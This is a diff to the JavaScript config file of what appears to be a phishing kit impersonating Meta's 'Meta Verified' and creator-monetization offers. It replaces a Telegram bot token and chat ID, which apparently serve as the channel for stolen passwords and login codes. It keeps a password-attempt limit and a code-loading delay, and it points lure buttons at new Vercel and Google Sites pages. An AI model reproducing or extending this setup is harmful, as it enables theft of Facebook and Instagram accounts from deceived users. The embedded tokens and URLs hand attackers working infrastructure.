@@ -1,6 +1,6 @@
 const config = {
-    token: '8637840256:AAEud4z2JlZWIn8no4C788bfnxUj-ZHlP_s',
-    chat_id: '-5153451675',
+    token: '9229914447:AAHvP6B-VRKeTa8yNmKJwC0a342pEP__M3c',
+    chat_id: '-5247926089',
     noti_token: '',
     noti_chat_id: '',
     max_password_attempts: 2,
@@ -9,9 +9,9 @@ const config = {
     code_loading_time: 4,
 
     /** URL khi bấm nút đăng ký trên modal Kiếm tiền (creator monetize) */
-    modal_creator_monetize_register_url: 'https://savemoneyia.vercel.app/live',
+    modal_creator_monetize_register_url: 'https://sites.google.com/view/verymetaai/meta',
 
     /** URL chung cho cả hai nút đăng ký (Facebook + Instagram) trên modal Meta Verified */
-    modal_meta_verified_register_url: 'https://bluetick-ten.vercel.app/live',
+    modal_meta_verified_register_url: 'https://sites.google.com/view/veryai2026/meta',
 };
 export default config;
